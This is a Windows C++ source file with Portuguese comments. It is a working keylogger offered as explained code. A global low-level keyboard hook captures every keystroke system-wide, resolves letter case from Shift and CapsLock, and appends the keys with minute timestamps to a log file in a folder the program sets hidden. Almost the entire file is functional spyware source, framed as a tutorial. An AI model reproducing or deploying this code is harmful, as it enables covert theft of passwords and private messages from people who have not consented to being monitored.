//Importando bibliotecas necessarias.
#include <iostream>
#include <string>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/stat.h>

using namespace std;

/*
Hook � uma forma de receber mensagens do sistema.
*/

/*
Declara��o de uma variavel global do tipo HHOOK, esse tipo de dado � definido na biblioteca
windows que representa um identificador para mensagens (hook) do Windows.
*/
HHOOK hook;
/*
O escopo das fun��es est�o sendo declarados a cima da fun��o main para melhor visualiza��o.
*/
void funcFiles(string ch);
/*
Declara��o de uma fun��o de retorno de chamada CALLBACK que ser� chamada sempre que um evento
de teclado ocorrer.
*/
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int main(){
    //Declarando variavel do tipo MSG
    MSG msg;
    /*
    Fun��o par monitorar o Sistema
    1. Monitora os eventos do teclado em baixo nivel
    2. � quem vai responder a chamada hook
    3. Se vai ser utilizado alguma DLL
    4. Se for 0 � para monitorar todas as a��es do sistema
    */
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);

    //Codi��o que verifica se esta tudo certo com hook
    if (hook == NULL)
    {
        cout << "Erro!";
        return 0;
    }
    /*ENQUANTO O RETORNO DE GetMessage FOR DIFERENTE DE 0
    GetMessage a fun��o recebe a pr�xima mensagem (se houver) na fila de mensagens do thread, ela espera at�
    que uma mensagem esteja dispon�vel. A mensagem � removida da fila e armazenada na estrutura MSG apontada por
    &msg. Se uma mensagem WM_QUIT � recebida, a fun��o retorna 0.
    */
    while(GetMessage(&msg, NULL, 0, 0) != 0){
        /*
        Traduz mensagens de teclado virtual, como uma entrada de tecla ou uma mensagem de caractere, para mensagens de caracter
        */
        TranslateMessage(&msg);
        /*
        Despacha a mensagem para o processo que deveria ir
        */
        DispatchMessage(&msg);
    }
    //Finaliza o processo de hook
    UnhookWindowsHookEx(hook);
}

/*
Fun��o de retorno da chamada hook do teclado
*/
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam){
    //Variavel que armazena os caracteres do teclado que forem pressionados
    char ch;
    //Variavel que vai transformar ch em string
    string str;

    /*
    Convertendo o valor de lParam para um ponteiro PKBDLLHOOKSTRUCT, o retorno dessa estrura contem
    informa��es do teclado, para nosso uso pegaremos apenas a variavel vkCode que armazena o codigo
    das teclas pressionadas.
    */
    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;

    /*
    Se a tecla for precionada e o c�digo de informa��o de wParam e lParam estiverem completas (WM_KEYDOWN e WM_KEYUP)
    e se o codigo de a��o hook � igual a HC_ACTION
    */
    if (wParam == WM_KEYDOWN && codigo == HC_ACTION)
    {
        /*
        Se o estado da tecla CapsLock estiver ativado com base no ultimo bit significativo
        */
        if (GetKeyState(VK_CAPITAL) & 0x0001)
        {
            /*
            Se a tecla SHIFT estiver precionada
            */
            if (GetAsyncKeyState(VK_SHIFT))
            {
                /*
                Atribui o valor apontado por kbDllHook -> vkCode(codigo da tecla) e soma +32 ao valor da tecla
                para que ela seja atribuida como minuscula em ch
                */
                ch = kbDllHook->vkCode + 32;
            }else{
                /*Se a tecla SHIFT n�o estiver sendo precionada atribuimos o valor real apontado por kbDllHook->vkCode
                */
                ch = kbDllHook->vkCode;
            }
        }else{  //Se a tecla CapsLock n�o estiver ativa
            /*
            Se a tecla SHIFT estiver precionada
            */
            if (GetAsyncKeyState(VK_SHIFT))
            {
                /*
                Atribui o valor real apontado por kbDllHook->vkCode mantendo o caracter maiusculo.
                */
                ch = kbDllHook->vkCode;
            }else{
            /*
            Se a tecla SHIFT n�o estiver precionada
            */
                /*
                Atribui o valor apontado por kbDllHook -> vkCode(codigo da tecla) e soma +32 ao valor da tecla
                para que ela seja atribuida como minuscula em ch
                */
                ch = kbDllHook->vkCode + 32;
            }
        }
        /*
        Se o valor apontado por kbDllHook->vkCode for igual ou maior que 0x30 E o valor apontado por kbDllHook->vkCode for menor ou igual a 0x39
        OU kbDllHook->vkCode for igual ou maior que 0XBA E o valor apontado por kbDllHook->vkCode for menor ou igual a 0xDF
        */

        /*
        Mapeamento das teclas com base nos seus valores na tabela ASCII
        */

        if ((kbDllHook->vkCode >= 0x30 && kbDllHook->vkCode <= 0x39) || (kbDllHook->vkCode >= 0xBA && kbDllHook->vkCode <= 0xDF))
        {
            /*
            A fun��o MapVirtualKeyA recebe o codigo da tecla precionada e converte no seu valor real correspondente no segundo parametro
            */
            ch = MapVirtualKeyA(kbDllHook->vkCode, MAPVK_VK_TO_CHAR);
        }
        /*Mostra no console a tecla pressionada
        printf("%c", ch);
        */
        //Adiciona ch em str para que se torne uma long string
        str += ch;
    }
    //Equanto o taamnho de str for diferente de 0
    while(str.size() != 0){
            //Chamando a fun��o que vai escrever no arquivo txt
            funcFiles(str);
            //Limpando a string depois de passar as teclas digitadas para a fun��o que escreve elas no arquivo
            str.clear();
    }

    /*
    Para que a aplica��o n�o bloquei outros processos hook usamos a fun��o CallNextHookEx, para chamar a pr�xima cadeia de hooks
    */
    return(CallNextHookEx(hook, codigo, wParam, lParam));
}

/*
Fun��o que cria nosso diretorio e arquivo para armazenar as teclas digitas, recebe como paramentro uma string
*/
void funcFiles(string ch){
    //Variavel que guarda o tempo inicial que aplica��o foi iniciada
	static time_t start = time(NULL);
	//Guarda o valor atual do tempo
	time_t now = time(NULL);

    //String que vai guardar nossa data e horas
	char dateTime[25];
	//A fun��o strftime esta formatando horas e data e atribuindo a variavel dateTime
	strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&now));
    //Criando a pasta Folder
	char *folder = "C:\\Folder";
	//Ocultando a pasta Folder
	SetFileAttributes(folder, FILE_ATTRIBUTE_HIDDEN);
    //Se acess retornar igual a -1 significa que a pasta j� existe
	if(access(folder, F_OK) == -1){
        //Se retornar 0 significa que aconteceu um erro
		CreateDirectory(folder, NULL);
	}
    //Cria o nosso arquivo logger
	FILE *file = fopen("C:\\Folder\\logger.txt", "a");
    //Se retornar diferente de NULL n�o aconteceu nenhum erro
	if(file != NULL){
	    //Se o tempo atual - o tempo inicial forem iguai ou maior que 60
		if(now - start >= 60){
		    //Tempo inicial � igual a tempo atual
			start = now;
            //Pulamos uma linha no arquivo
			fputs("\n", file);
			//Formatando a data e horas
			strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&now));
			//Inserindo a nova data e hora no arquivo
			fputs(dateTime, file);
			//Pulando uma linha
			fputs("\n", file);
		}
		//Colocando no arquivo a letra digitada
		//A fun��o fputs recebe uma long strinf por isso usamos c_str()
		fputs(ch.c_str(), file);
		//Fechamos o arquivo
		fclose(file);
	}

	//Linhas para verifica��o de erros
	/*
	if(access(folder, F_OK) != -1){
		cout << "Pasta existente!\n";
	}else{
		if(CreateDirectory(folder, NULL) == 0){
			cout << "Erro ao criar pasta!";
		}
	}

	if(file != NULL){
		if(agora - incial >= 60){
			incial = agora;
			fputs("\n", file);
			strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&agora));
			fputs(dateTime, file);
			fputs("\n", file);
		}
		fputs(ch.c_str(), file);
		fclose(file);
	}else{
		cout << "Erro ao abrir o arquivo!";
	}
	*/
}
